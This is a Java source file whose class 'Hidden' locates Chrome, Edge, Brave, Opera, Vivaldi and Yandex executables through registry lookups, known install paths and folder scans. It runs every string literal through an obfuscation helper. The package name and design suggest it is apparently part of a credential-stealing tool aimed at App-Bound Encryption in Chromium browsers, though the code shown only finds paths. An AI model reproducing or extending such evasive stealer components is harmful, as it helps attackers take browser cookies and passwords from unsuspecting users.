package noface.browsers.abe;

import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.WinReg;
import noface.config.S;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Comparator;
import java.util.stream.Stream;

public final class Hidden {

    public static Path exe(String browser) {
        String exeName = exeName(browser);
        if (exeName == null) return null;
        Path reg = fromReg(exeName);
        if (reg != null) return reg;
        Path known = known(browser);
        if (known != null) return known;
        return scan(browser);
    }

    private static Path fromReg(String exeName) {
        String regPath = S.e("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\") + exeName;
        for (WinReg.HKEY hive : new WinReg.HKEY[]{WinReg.HKEY_LOCAL_MACHINE, WinReg.HKEY_CURRENT_USER}) {
            try {
                String value = Advapi32Util.registryGetStringValue(hive, regPath, "");
                if (value != null && !value.isBlank()) {
                    Path p = Path.of(value.replace(S.e("\""), "").trim());
                    if (Files.isRegularFile(p)) return p;
                }
            } catch (Throwable ignored) {}
        }
        return null;
    }

    private static Path known(String browser) {
        String local = env(S.e("LOCALAPPDATA"));
        String pf = env(S.e("ProgramFiles"));
        String pf86 = env(S.e("ProgramFiles(x86)"));
        String appData = env(S.e("APPDATA"));
        if (browser.equals(S.e("Chrome"))) return first(
                Path.of(pf, S.e("Google"), S.e("Chrome"), S.e("Application"), S.e("chrome.exe")),
                Path.of(pf86, S.e("Google"), S.e("Chrome"), S.e("Application"), S.e("chrome.exe")),
                Path.of(local, S.e("Google"), S.e("Chrome"), S.e("Application"), S.e("chrome.exe")));
        if (browser.equals(S.e("Edge"))) return first(
                Path.of(pf, S.e("Microsoft"), S.e("Edge"), S.e("Application"), S.e("msedge.exe")),
                Path.of(pf86, S.e("Microsoft"), S.e("Edge"), S.e("Application"), S.e("msedge.exe")));
        if (browser.equals(S.e("Brave"))) return first(
                Path.of(pf, S.e("BraveSoftware"), S.e("Brave-Browser"), S.e("Application"), S.e("brave.exe")),
                Path.of(local, S.e("BraveSoftware"), S.e("Brave-Browser"), S.e("Application"), S.e("brave.exe")));
        if (browser.equals(S.e("Vivaldi"))) return first(Path.of(local, S.e("Vivaldi"), S.e("Application"), S.e("vivaldi.exe")));
        if (browser.equals(S.e("Opera"))) return first(
                Path.of(local, S.e("Programs"), S.e("Opera"), S.e("opera.exe")),
                Path.of(appData, S.e("Opera Software"), S.e("Opera Stable"), S.e("opera.exe")));
        if (browser.equals(S.e("OperaGX"))) return first(
                Path.of(local, S.e("Programs"), S.e("Opera GX"), S.e("opera.exe")),
                Path.of(local, S.e("Programs"), S.e("Opera"), S.e("opera.exe")),
                Path.of(appData, S.e("Opera Software"), S.e("Opera GX Stable"), S.e("opera.exe")));
        if (browser.equals(S.e("Yandex"))) return first(Path.of(local, S.e("Yandex"), S.e("YandexBrowser"), S.e("Application"), S.e("browser.exe")));
        return null;
    }

    private static Path scan(String browser) {
        Path appDir = null;
        if (browser.equals(S.e("Chrome"))) appDir = firstDir(Path.of(env(S.e("ProgramFiles")), S.e("Google"), S.e("Chrome"), S.e("Application")));
        else if (browser.equals(S.e("Edge"))) appDir = firstDir(Path.of(env(S.e("ProgramFiles")), S.e("Microsoft"), S.e("Edge"), S.e("Application")));
        else if (browser.equals(S.e("Brave"))) appDir = firstDir(Path.of(env(S.e("ProgramFiles")), S.e("BraveSoftware"), S.e("Brave-Browser"), S.e("Application")));
        if (appDir == null) return null;
        String exe = exeName(browser);
        try (Stream<Path> dirs = Files.list(appDir)) {
            return dirs.filter(Files::isDirectory)
                    .filter(d -> {
                        String n = d.getFileName().toString();
                        return !n.isEmpty() && Character.isDigit(n.charAt(0));
                    })
                    .max(Comparator.comparing(d -> d.getFileName().toString()))
                    .map(d -> d.resolve(exe))
                    .filter(Files::isRegularFile)
                    .orElse(null);
        } catch (Exception e) {
            return null;
        }
    }

    private static String exeName(String browser) {
        if (browser.equals(S.e("Chrome"))) return S.e("chrome.exe");
        if (browser.equals(S.e("Edge"))) return S.e("msedge.exe");
        if (browser.equals(S.e("Brave"))) return S.e("brave.exe");
        if (browser.equals(S.e("Vivaldi"))) return S.e("vivaldi.exe");
        if (browser.equals(S.e("Opera")) || browser.equals(S.e("OperaGX"))) return S.e("opera.exe");
        if (browser.equals(S.e("Yandex"))) return S.e("browser.exe");
        return null;
    }

    private static Path first(Path... paths) {
        for (Path p : paths) if (p != null && Files.isRegularFile(p)) return p;
        return null;
    }

    private static Path firstDir(Path... paths) {
        for (Path p : paths) if (p != null && Files.isDirectory(p)) return p;
        return null;
    }

    private static String env(String key) {
        String v = System.getenv(key);
        return v == null ? "" : v;
    }

    private Hidden() {}
}
